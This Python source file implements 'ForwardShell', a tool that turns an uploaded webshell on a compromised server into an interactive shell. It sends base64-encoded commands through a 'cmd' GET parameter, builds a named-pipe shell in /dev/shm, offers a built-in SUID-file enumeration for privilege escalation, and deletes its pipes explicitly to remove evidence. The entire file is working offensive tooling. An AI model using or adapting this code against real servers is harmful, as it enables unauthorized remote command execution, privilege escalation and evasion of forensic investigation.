#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import requests
from random import randrange
from base64 import b64encode
from termcolor import colored

"""
ForwardShell allows interacting with a remote webshell
as if it were an interactive shell.
"""


class ForwardShell:

    def __init__(self, url):
        self.main_url= url
        session = randrange(1000, 9999)
        self.stdin= f"/dev/shm/{session}.input"
        self.help_options = {'!enum-suid': 'FileSystem SUID Privileges Enumeration', '!help': 'Show help panel'}
        self.stdout= f"/dev/shm/{session}.output"
        self.is_pseudo_term=False



    def setup_shell(self):
        """
        Creates a named pipe to simulate an interactive session.
        """

        command = f" mkfifo %s; tail -f %s | /bin/sh 1>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)


    def run_command(self, command):
        """
        Executes a command remotely through the webshell using base64 encoding.
        """

        command = b64encode(command.encode()).decode()
        data = {
                'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
                }
        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except:
            pass
        return None

    def write_stdin(self, command):
        """
        Writes a command into the stdin pipe.
        """

        command = b64encode(command.encode()).decode()

        data= {
                'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)

        }
        r = requests.get(self.main_url, params=data)

    def read_stdout(self):
        """
        Reads the command output from the stdout pipe.
        """

        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.2)
        return output_command

    def clear_stdout(self):
        """
        Clears the stdout pipe content.
        """

        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)

    def remove_data(self):
        """
        Cleans up input/output pipes to remove evidence.
        """

        erase_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(erase_data_command)

    def help_panel(self):
        """
        Displays available commands (!enum-suid, !help).
        """

        print(colored(f"\n[i] Help Panel:", 'yellow'))
        for key, value in self.help_options.items():
            print(colored(f"\t{key} -- {value}\n",'magenta'))

    def run(self):
        """
        Main loop: allows sending commands and handling pseudo terminal.
        """

        self.setup_shell()
        while True:
            command = input(colored("\n>> ", 'green'))

            if "script /dev/null -c bash" in command:
                print(colored(f"\n[i] Pseudo terminal has been started\n", 'yellow'))
                self.is_pseudo_term = True

            match command.strip():

                case '!enum-suid':  # Set a command that list of SUID files in the system
                    command = f"find / -perm -4000 2>/dev/null | xargs ls -l"

                case '!help':   # Show help
                    self.help_panel()
                    continue

            # Send command to remote shell
            self.write_stdin(command + '\n')
            output_command = self.read_stdout()

            # Handle exit in pseudo terminal
            if 'exit' in command.strip() and self.is_pseudo_term:
                self.is_pseudo_term = False
                print(colored(f"\n[!] Stopping Pseudo terminal...\n", 'red'))
                self.clear_stdout()
                continue

            # Print output
            if self.is_pseudo_term: # Adjust output for pseudo terminal mode
                lines = output_command.split('\n')
                if len(lines) == 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                else:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])
                print(colored(f"\n{cleared_output}\n", 'blue'))

            else:
                print(colored(f"{output_command}", 'blue'))
            self.clear_stdout()

